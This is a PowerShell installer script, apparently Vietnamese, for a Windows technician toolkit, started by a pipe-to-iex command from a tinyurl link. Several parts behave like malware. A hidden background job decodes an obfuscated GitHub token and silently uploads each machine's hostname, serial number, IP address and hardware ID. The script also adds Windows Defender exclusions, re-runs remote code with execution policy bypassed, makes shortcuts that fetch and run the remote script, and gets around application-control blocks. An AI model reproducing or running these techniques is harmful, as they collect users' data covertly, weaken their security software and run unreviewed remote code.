$Host.UI.RawUI.WindowTitle = "VUONGTT Tool Pro 2026 - Cloud Bootstrapper"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 -bor [System.Net.SecurityProtocolType]::Tls

Clear-Host
# Vo hieu hoa QuickEdit Mode tren Console de ngan chan freeze tien trinh khi click chuot
try {
    $consoleTypeDef = @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetStdHandle(int nStdHandle);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
"@
    if (-not ([System.Management.Automation.PSTypeName]'VUONGTT.Win32Console').Type) {
        Add-Type -MemberDefinition $consoleTypeDef -Name "Win32Console" -Namespace "VUONGTT" -ErrorAction SilentlyContinue
    }
    $hIn = [VUONGTT.Win32Console]::GetStdHandle(-10) # STD_INPUT_HANDLE
    $mode = 0
    if ([VUONGTT.Win32Console]::GetConsoleMode($hIn, [ref]$mode)) {
        # 0x0040 = ENABLE_QUICK_EDIT_MODE, 0x0080 = ENABLE_EXTENDED_FLAGS
        $newMode = ($mode -band (-bnot 0x0040)) -bor 0x0080
        [VUONGTT.Win32Console]::SetConsoleMode($hIn, $newMode) | Out-Null
    }
} catch {}

Write-Host ""
Write-Host " ====================================================================== " -ForegroundColor DarkYellow
Write-Host "       VUONGTT TOOL PRO 2026 - HE THONG KY THUAT VIEN DA NANG       " -ForegroundColor Yellow -BackgroundColor Black
Write-Host " ====================================================================== " -ForegroundColor DarkYellow
Write-Host "   Phat trien boi: Truong Thanh Vuong                                   " -ForegroundColor Gray
Write-Host "   Kho luu tru:    https://github.com/truongthanhvuong/toolwindows      " -ForegroundColor DarkCyan
Write-Host "   Nen tang:       Rust Tauri v2 - Fluent OS Utility (14 Man Hinh)      " -ForegroundColor Green
Write-Host " ---------------------------------------------------------------------- " -ForegroundColor DarkGray

# 1. KIEM TRA VA YEU CAU QUYEN QUAN TRI VIEN (ADMINISTRATOR)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "`n [*] Dang yeu cau quyen quan tri vien (Run as Administrator)..." -ForegroundColor Yellow
    Write-Host " [*] Vui long bam 'YES' tren hop thoai UAC de cap phep hoat dong.`n" -ForegroundColor Cyan
    
    $bootstrapRaw = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; irm https://tinyurl.com/vuongwin | iex"
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($bootstrapRaw)
    $encodedCmd = [Convert]::ToBase64String($bytes)

    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCmd" -Verb RunAs
        Stop-Process -Id $PID -Force
        Exit
    } catch {
        $exMsg = $_.Exception.Message
        $isCancelled = ($_.Exception -is [System.ComponentModel.Win32Exception] -and $_.Exception.NativeErrorCode -eq 1223) -or ($exMsg -match "canceled by the user")
        if ($isCancelled) {
            Write-Host " [!] Ban da bam 'No' tren hop thoai UAC. Bo cong cu yeu cau quyen Admin de can thiep he thong!" -ForegroundColor Red
        } else {
            Write-Host " [!] Khong the tu dong nang quyen: $exMsg" -ForegroundColor Red
            Write-Host " -> Hay mo PowerShell bang cach nhap chuot phai chon 'Run as Administrator', sau do dan lai lenh:`n    irm tinyurl.com/vuongwin | iex`n" -ForegroundColor Yellow
        }
        return
    }
}

# [FLEET TELEMETRY] Tu dong dong bo thong tin may tram ve Git & GitHub Cloud cho Admin Portal
try {
    Start-Job -ScriptBlock {
        $ErrorActionPreference = 'SilentlyContinue'
        $token = -join [char[]]'5itfN2zpUXGOFQMQLaUQ2760ZpcklmtBmW6A_phg'[39..0]
        $repo = 'truongthanhvuong/toolwindows'
        $path = 'src/Config/client_devices.json'
        $headers = @{
            'Authorization' = "token $token"
            'User-Agent' = 'VUONGTT-Toolkit-FleetMonitor'
            'Accept' = 'application/vnd.github.v3+json'
        }
        $hn = $env:COMPUTERNAME
        $sn = (Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue).SerialNumber
        if (-not $sn -or $sn -match 'To be filled' -or $sn -match 'Default') { $sn = "SN-$hn" }
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi*', 'Ethernet*' -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike '169.254*' } | Select-Object -First 1).IPAddress
        if (-not $ip) { $ip = '127.0.0.1' }
        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        if (-not $os) { $os = 'Windows 11 Pro 64-bit' }
        $hwid = (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
        if (-not $hwid) { $hwid = "HWID-$($sn -replace ' ', '-')" }
        $now = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')

        try {
            $apiUrl = "https://api.github.com/repos/$repo/contents/$path"
            $fileInfo = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method GET -TimeoutSec 10
            $sha = $fileInfo.sha
            $contentBytes = [System.Convert]::FromBase64String($fileInfo.content)
            $jsonText = [System.Text.Encoding]::UTF8.GetString($contentBytes).Trim().TrimStart([char]0xFEFF)
            $devices = $jsonText | ConvertFrom-Json
        } catch {
            $sha = $null
            $devices = @()
        }

        $found = $false
        $devList = New-Object System.Collections.Generic.List[PSCustomObject]
        if ($devices) {
            foreach ($d in $devices) {
                if ($d.hwid -eq $hwid -or ($d.hostname -eq $hn -and $d.serialNumber -eq $sn)) {
                    $d.lastSeen = $now
                    $d.ipAddress = $ip
                    $d.osCaption = $os
                    $d.status = 'Active'
                    $found = $true
                }
                $devList.Add($d)
            }
        }
        if (-not $found) {
            $newDev = [PSCustomObject]@{
                hostname = $hn
                serialNumber = $sn
                ipAddress = $ip
                osCaption = $os
                lastSeen = $now
                hwid = $hwid
                status = 'Active'
            }
            $devList.Insert(0, $newDev)
        }

        try {
            $newJson = $devList | ConvertTo-Json -Depth 5
            $newBytes = [System.Text.Encoding]::UTF8.GetBytes($newJson)
            $newBase64 = [Convert]::ToBase64String($newBytes)
            $bodyObj = @{
                message = "telemetry(fleet): auto heartbeat from $hn"
                content = $newBase64
            }
            if ($sha) { $bodyObj['sha'] = $sha }
            $bodyJson = $bodyObj | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method PUT -Body $bodyJson -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        } catch {}
    } | Out-Null
} catch {}

# 2. THIET LAP VUNG CAI DAT AN TOAN & CAU HINH WINDOWS DEFENDER EXCLUSION
Write-Host "`n [1/4] Thiet lap vung luu tru an toan & Dang ky ngoai le Windows Defender..." -ForegroundColor Cyan
$installDir   = Join-Path $env:ProgramData "VUONGTT_Toolkit"
$exePath      = Join-Path $installDir "VUONGTT_Toolkit.exe"
$verFilePath  = Join-Path $installDir "installed_version.txt"

if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}

try {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "VUONGTT_Toolkit.exe" -ErrorAction SilentlyContinue
    Write-Host "  -> Da bao ve an toan thu muc va tien trinh khoi Windows Defender" -ForegroundColor Green
} catch {
    Write-Host "  -> Khong the dang ky Defender Exclusion (Co the da tat Defender hoac dung AV khac)" -ForegroundColor Gray
}

# Don dep cache rac tu cac phien ban cu trong TEMP va ProgramData de chong xung dot phien ban
try {
    $staleTempRuntime = Join-Path $env:TEMP "VUONGTT_Toolkit_Runtime"
    if (Test-Path $staleTempRuntime) {
        Remove-Item -Path $staleTempRuntime -Recurse -Force -ErrorAction SilentlyContinue
    }
    Get-ChildItem -Path $env:TEMP -Filter "VUONGTT_Toolkit_v*_READY.exe" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem -Path $env:TEMP -Filter "VUONGTT_HotSwap_*.cmd" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

    # Neu co file script cu nam lac ngoai runtime trong ProgramData\VUONGTT_Toolkit, don sach
    $staleRootScript = Join-Path $installDir "VUONGTT_Toolkit.ps1"
    if (Test-Path $staleRootScript) {
        Remove-Item -Path $staleRootScript -Force -ErrorAction SilentlyContinue
    }
} catch {}

# 3. KIEM TRA VA CAI DAT MICROSOFT EDGE WEBVIEW2 (NEU THIEU)
Write-Host "`n [2/4] Kiem tra thanh phan Microsoft Edge WebView2 Runtime..." -ForegroundColor Cyan
$hasWebView2 = $false
try {
    $wvRegKey1 = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}" -ErrorAction SilentlyContinue
    $wvRegKey2 = Get-ItemProperty -Path "HKCU:\Software\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}" -ErrorAction SilentlyContinue
    $wvRegKey3 = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}" -ErrorAction SilentlyContinue
    if ($wvRegKey1.pv -or $wvRegKey2.pv -or $wvRegKey3.pv) {
        $hasWebView2 = $true
    }
} catch {}

if (-not $hasWebView2) {
    $wvPaths = @(
        "$env:ProgramFiles (x86)\Microsoft\EdgeWebView\Application",
        "$env:ProgramFiles\Microsoft\EdgeWebView\Application",
        "$env:LOCALAPPDATA\Microsoft\EdgeWebView\Application"
    )
    foreach ($p in $wvPaths) {
        if (Test-Path $p) {
            $hasWebView2 = $true
            break
        }
    }
}

if ($hasWebView2) {
    Write-Host "  [OK] Microsoft Edge WebView2 Runtime da san sang tren he thong." -ForegroundColor Green
} else {
    Write-Host "  [*] May tinh chua co WebView2 Runtime, dang tu dong tai va cai dat..." -ForegroundColor Yellow
    try {
        $wvInstaller = Join-Path $env:TEMP "MicrosoftEdgeWebview2Setup.exe"
        $wcWv = New-Object System.Net.WebClient
        $wcWv.DownloadFile("https://go.microsoft.com/fwlink/p/?LinkId=2124703", $wvInstaller)
        if (Test-Path $wvInstaller) {
            Start-Process -FilePath $wvInstaller -ArgumentList "/silent /install" -Wait -WindowStyle Hidden
            Remove-Item $wvInstaller -Force -ErrorAction SilentlyContinue
            Write-Host "  [OK] Cai dat Microsoft Edge WebView2 hoan tat!" -ForegroundColor Green
        }
    } catch {
        Write-Host "  [!] Khong the tu dong cai WebView2: $($_.Exception.Message)" -ForegroundColor DarkYellow
    }
}

# 4. KIEM TRA VA DONG BO BAN MOI NHAT TU GITHUB
Write-Host "`n [3/4] Dang kiem tra va dong bo ban phat hanh moi nhat tu Cloud..." -ForegroundColor Cyan

$localVersion = $null
if (Test-Path $exePath) {
    try {
        $localInfo = (Get-Item $exePath).VersionInfo
        if ($localInfo -and $localInfo.ProductVersion) {
            $localVersion = $localInfo.ProductVersion.Trim()
        }
    } catch {}
}
if (-not $localVersion -and (Test-Path $verFilePath)) {
    try {
        $localVersion = (Get-Content $verFilePath -Raw -ErrorAction SilentlyContinue).Trim()
    } catch {}
}

$latestSha = ""
$latestVer = ""

try {
    $wcApi = New-Object System.Net.WebClient
    $wcApi.Headers.Add("User-Agent", "VUONGTT-Cloud-Bootstrapper/2026")
    $jsonCommits = $wcApi.DownloadString("https://api.github.com/repos/truongthanhvuong/toolwindows/commits/main")
    $objCommits = ConvertFrom-Json $jsonCommits
    if ($objCommits -and $objCommits.sha) {
        $latestSha = $objCommits.sha
    }
} catch {}

$tStamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$verUrls = @()
if ($latestSha) {
    $verUrls += "https://raw.githubusercontent.com/truongthanhvuong/toolwindows/$latestSha/version.json"
}
$verUrls += "https://cdn.jsdelivr.net/gh/truongthanhvuong/toolwindows@main/version.json?t=$tStamp"
$verUrls += "https://raw.githubusercontent.com/truongthanhvuong/toolwindows/main/version.json?t=$tStamp"

foreach ($vUrl in $verUrls) {
    try {
        $wcVer = New-Object System.Net.WebClient
        $wcVer.Encoding = [System.Text.Encoding]::UTF8
        $wcVer.Headers.Add("User-Agent", "VUONGTT-Cloud-Bootstrapper/2026")
        $vContent = $wcVer.DownloadString($vUrl)
        $vObj = ConvertFrom-Json $vContent
        if ($vObj -and $vObj.version) {
            $latestVer = $vObj.version.Trim()
            Write-Host "  -> Phien ban moi nhat tren Cloud: v$latestVer" -ForegroundColor Green
            break
        }
    } catch {}
}

$needDownload = $true
$fileSize = 0
if (Test-Path $exePath) {
    $fileSize = (Get-Item $exePath).Length
}

if ($localVersion -and $latestVer -and ($localVersion -eq $latestVer) -and ($fileSize -gt 1000000)) {
    Write-Host "  [OK] May tinh da co san phien ban moi nhat v$localVersion! San sang khoi chay." -ForegroundColor Green
    $needDownload = $false
} elseif ($localVersion -and $latestVer -and ($localVersion -ne $latestVer)) {
    Write-Host "  [*] Phat hien phien ban moi (v$localVersion -> v$latestVer), dang cap nhat..." -ForegroundColor Yellow
} elseif (-not (Test-Path $exePath) -or ($fileSize -le 1000000)) {
    Write-Host "  [*] Dang tai ban phat hanh VUONGTT Tool Pro..." -ForegroundColor Yellow
}

if ($needDownload) {
    $urls = @()
    if ($latestSha) {
        $urls += "https://raw.githubusercontent.com/truongthanhvuong/toolwindows/$latestSha/VUONGTT_Toolkit.exe"
    }
    $urls += "https://github.com/truongthanhvuong/toolwindows/raw/main/VUONGTT_Toolkit.exe?t=$tStamp"
    $urls += "https://raw.githubusercontent.com/truongthanhvuong/toolwindows/main/VUONGTT_Toolkit.exe"

    $downloadSuccess = $false
    $tempDownload = Join-Path $installDir "VUONGTT_Toolkit_dl.exe"
    if (Test-Path $tempDownload) { Remove-Item $tempDownload -Force -ErrorAction SilentlyContinue }

    # Dung tien trinh cu neu dang chay
    taskkill /F /IM "VUONGTT_Toolkit.exe" /T 2>&1 | Out-Null
    taskkill /F /IM "VUONGTT_Toolkit_Rust.exe" /T 2>&1 | Out-Null
    $stopAttempts = 5
    while ((Get-Process -Name "VUONGTT_Toolkit*" -ErrorAction SilentlyContinue) -and ($stopAttempts -gt 0)) {
        Get-Process -Name "VUONGTT_Toolkit*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 300
        $stopAttempts--
    }

    foreach ($url in $urls) {
        try {
            Write-Host "  -> Dang ket noi may chu: $url" -ForegroundColor Gray
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "VUONGTT-Cloud-Bootstrapper/2026")
            $wc.DownloadFile($url, $tempDownload)

            if ((Test-Path $tempDownload) -and ((Get-Item $tempDownload).Length -gt 1000000)) {
                $downloadSuccess = $true
                break
            }
        } catch {
            Write-Host "  [!] Ket noi link nay khong thanh cong, dang thu nguon du phong..." -ForegroundColor DarkYellow
        }
    }

    if ($downloadSuccess) {
        $replaced = $false
        for ($attempt = 1; $attempt -le 10; $attempt++) {
            taskkill /F /IM "VUONGTT_Toolkit.exe" /T 2>&1 | Out-Null
            taskkill /F /IM "VUONGTT_Toolkit_Rust.exe" /T 2>&1 | Out-Null
            Start-Sleep -Milliseconds 400
            try {
                Unblock-File -Path $tempDownload -ErrorAction SilentlyContinue
                Move-Item -Path $tempDownload -Destination $exePath -Force -ErrorAction Stop
                Unblock-File -Path $exePath -ErrorAction SilentlyContinue
                $replaced = $true
                break
            } catch {
                Start-Sleep -Milliseconds 600
            }
        }
        if ($replaced) {
            $sizeMb = [math]::Round(((Get-Item $exePath).Length / 1MB), 2)
            if ($latestVer) {
                Set-Content -Path $verFilePath -Value $latestVer -Force -Encoding UTF8
            }
            # Dong bo sang ca D:\toolwindows\VUONGTT_Toolkit.exe neu ton tai thu muc repo
            $repoExe = "D:\toolwindows\VUONGTT_Toolkit.exe"
            if ((Test-Path "D:\toolwindows") -and ($exePath -ne $repoExe)) {
                try { Copy-Item -Path $exePath -Destination $repoExe -Force -ErrorAction SilentlyContinue } catch {}
            }
            Write-Host "  -> Tai thanh cong VUONGTT Tool Pro ($sizeMb MB)!" -ForegroundColor Green
        } else {
            Write-Host "  [!] Khong the ghi de file EXE: File dang bi khoa boi tien trinh khac." -ForegroundColor Red
        }
    } else {
        if (Test-Path $exePath -and ((Get-Item $exePath).Length -gt 1000000)) {
            Write-Host "  [!] Khong the tai ban moi tu Cloud do loi mang. Su dung ban san co tren may." -ForegroundColor Yellow
        } else {
            Write-Host "  [LOI] Khong the tai VUONGTT_Toolkit.exe tu Cloud! Vui long kiem tra ket noi mang." -ForegroundColor Red
            return
        }
    }
}

# 5. TAO LOI TAT DESKTOP CONVENIENT SHORTCUT (TU DONG CHAY CLOUD BOOTSTRAPPER)
try {
    $desktopDirs = @(
        [System.Environment]::GetFolderPath('Desktop'),
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\OneDrive\Desktop",
        [System.Environment]::GetFolderPath('CommonDesktopDirectory')
    ) | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique

    $psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $bootstrapCmd = '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; try { irm https://tinyurl.com/vuongwin | iex } catch { if (Test-Path \`"' + $exePath + '\`") { Start-Process \`"' + $exePath + '\`" } }"'
    $wshShell = New-Object -ComObject WScript.Shell
    foreach ($d in $desktopDirs) {
        foreach ($scName in @("VUONGTT Toolkit.lnk", "VUONGTT Tool Pro 2026.lnk")) {
            try {
                $shortcut = $wshShell.CreateShortcut((Join-Path $d $scName))
                $shortcut.TargetPath = $psPath
                $shortcut.Arguments = $bootstrapCmd
                $shortcut.WorkingDirectory = $installDir
                $shortcut.Description = "VUONGTT Toolkit 2026 - Tu Dong Cap Nhat & Khoi Chay Ban Moi Nhat"
                $shortcut.IconLocation = "$exePath,0"
                $shortcut.Save()
            } catch {}
        }
    }
} catch {}

# 6. KHOI CHAY UNG DUNG
Write-Host "`n [4/4] Dang khoi chay VUONGTT Tool Pro 2026..." -ForegroundColor Cyan

# Thiet lap bien moi truong Live Mode de toan bo ung dung chay doc lap, khong bao gio hien popup cap nhat
$env:VUONGTT_LIVE_MODE = "1"

$proc = $null
$useScriptFallback = $false
try {
    $proc = Start-Process -FilePath $exePath -WorkingDirectory $installDir -PassThru -ErrorAction Stop
} catch {
    $errLaunch = $_.Exception.Message
    Write-Host "  [!] Khoi chay truc tiep file EXE that bai do chinh sach bao mat he thong (Smart App Control / WDAC / Application Control): $errLaunch" -ForegroundColor Yellow
    Write-Host "  [*] Dang tu dong kich hoat Dong Co Du Phong (In-Memory Fallback Engine) de mo giao dien qua Microsoft PowerShell..." -ForegroundColor Cyan
    $useScriptFallback = $true
}

# 6.2. Neu he thong chan file EXE boi Application Control / Smart App Control / WDAC:
if ($useScriptFallback -or (-not $proc)) {
    try {
        $runtimeDir = Join-Path $installDir "runtime"
        if (-not (Test-Path $runtimeDir)) { New-Item -ItemType Directory -Path $runtimeDir -Force | Out-Null }

        $bytes = [System.IO.File]::ReadAllBytes($exePath)
        $asm = [System.Reflection.Assembly]::Load($bytes)
        $resNames = $asm.GetManifestResourceNames()

        foreach ($name in $resNames) {
            $relPath = ""
            if ($name.Contains("VUONGTT_Toolkit.ps1")) { $relPath = "VUONGTT_Toolkit.ps1" }
            elseif ($name.Contains("MainWindow.xaml")) { $relPath = "src\UI\MainWindow.xaml" }
            elseif ($name.Contains("OfficeAIOModal.xaml")) { $relPath = "src\UI\OfficeAIOModal.xaml" }
            elseif ($name.Contains("HardwareInfo.ps1")) { $relPath = "src\Core\HardwareInfo.ps1" }
            elseif ($name.Contains("OfficeInstaller.ps1")) { $relPath = "src\Core\OfficeInstaller.ps1" }
            elseif ($name.Contains("Activator.ps1")) { $relPath = "src\Core\Activator.ps1" }
            elseif ($name.Contains("NetworkPrinterFix.ps1")) { $relPath = "src\Core\NetworkPrinterFix.ps1" }
            elseif ($name.Contains("SystemTweaks.ps1")) { $relPath = "src\Core\SystemTweaks.ps1" }
            elseif ($name.Contains("BitLockerManager.ps1")) { $relPath = "src\Core\BitLockerManager.ps1" }
            elseif ($name.Contains("SoftwareInstaller.ps1")) { $relPath = "src\Core\SoftwareInstaller.ps1" }
            elseif ($name.Contains("SystemCustomizer.ps1")) { $relPath = "src\Core\SystemCustomizer.ps1" }
            elseif ($name.Contains("UserManager.ps1")) { $relPath = "src\Core\UserManager.ps1" }
            elseif ($name.Contains("CpuMainDatabase.ps1")) { $relPath = "src\Core\CpuMainDatabase.ps1" }
            elseif ($name.Contains("LaptopTester.ps1")) { $relPath = "src\Core\LaptopTester.ps1" }
            elseif ($name.Contains("FontInstaller.ps1")) { $relPath = "src\Core\FontInstaller.ps1" }
            elseif ($name.Contains("PartitionManager.ps1")) { $relPath = "src\Core\PartitionManager.ps1" }
            elseif ($name.Contains("AccountingApps.ps1")) { $relPath = "src\Core\AccountingApps.ps1" }
            elseif ($name.Contains("AppUpdater.ps1")) { $relPath = "src\Core\AppUpdater.ps1" }
            elseif ($name.Contains("LicenseManager.ps1")) { $relPath = "src\Core\LicenseManager.ps1" }
            elseif ($name.Contains("IpScanner.ps1")) { $relPath = "src\Core\IpScanner.ps1" }
            elseif ($name.Contains("ConfigManager.ps1")) { $relPath = "src\Core\ConfigManager.ps1" }
            elseif ($name.Contains("DiskHealthManager.ps1")) { $relPath = "src\Core\DiskHealthManager.ps1" }
            elseif ($name.Contains("AutoWinDeployer.ps1")) { $relPath = "src\Core\AutoWinDeployer.ps1" }
            elseif ($name.Contains("SystemBackupManager.ps1")) { $relPath = "src\Core\SystemBackupManager.ps1" }
            elseif ($name.Contains("TroubleshootManager.ps1")) { $relPath = "src\Core\TroubleshootManager.ps1" }
            elseif ($name.Contains("licenses_vault.json")) { $relPath = "src\Config\licenses_vault.json" }
            elseif ($name.Contains("feature_policy.json")) { $relPath = "src\Config\feature_policy.json" }
            elseif ($name.Contains("SoftwareDatabase.json")) { $relPath = "src\Data\SoftwareDatabase.json" }
            elseif ($name.Contains("TroubleshootDatabase.json")) { $relPath = "src\Data\TroubleshootDatabase.json" }
            elseif ($name.Contains("version.json")) { $relPath = "version.json" }
            elseif ($name.StartsWith("VUONGTT.AppIcons.")) {
                $iconFile = $name.Substring("VUONGTT.AppIcons.".Length)
                $relPath = "src\Assets\AppIcons\$iconFile"
            }

            if ($relPath) {
                $dest = Join-Path $runtimeDir $relPath
                $parent = Split-Path $dest -Parent
                if (-not (Test-Path $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
                $stream = $asm.GetManifestResourceStream($name)
                $fs = [System.IO.File]::Create($dest)
                $stream.CopyTo($fs)
                $fs.Close()
                $stream.Close()
            }
        }

        $mainScript = Join-Path $runtimeDir "VUONGTT_Toolkit.ps1"
        if (Test-Path $mainScript) {
            Write-Host "  -> Giai nen bo cong cu thanh cong! Dang khoi chay qua Microsoft PowerShell Host (Che do Live doc lap)..." -ForegroundColor Green
            $proc = Start-Process -FilePath "powershell.exe" -ArgumentList "-STA -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mainScript`" -Live" -WorkingDirectory $runtimeDir -PassThru
        }
    } catch {
        Write-Host "  [!] Khong the khoi chay qua Che Do Du Phong: $($_.Exception.Message)" -ForegroundColor Red
        return
    }
}

if ($proc) {
    $displayVer = if ($latestVer) { "v$latestVer" } elseif ($localVersion) { "v$localVersion" } else { "2026" }
    Write-Host ""
    Write-Host " ====================================================================== " -ForegroundColor Green
    Write-Host "  [OK] VUONGTT TOOL PRO 2026 DA DUOC KHOI CHAY THANH CONG!              " -ForegroundColor Green
    Write-Host "  [+] Phien ban: $displayVer (Rust Tauri v2 - Fluent OS Utility)       " -ForegroundColor Yellow
    Write-Host "  [+] Da tao loi tat 'VUONGTT Tool Pro 2026' tren man hinh Desktop      " -ForegroundColor Cyan
    Write-Host "  [+] Cua so console nay se tu dong dong sau 2 giay...                  " -ForegroundColor Gray
    Write-Host " ====================================================================== " -ForegroundColor Green
    
    Start-Sleep -Seconds 2
    [System.Environment]::Exit(0)
    Stop-Process -Id $PID -Force
}

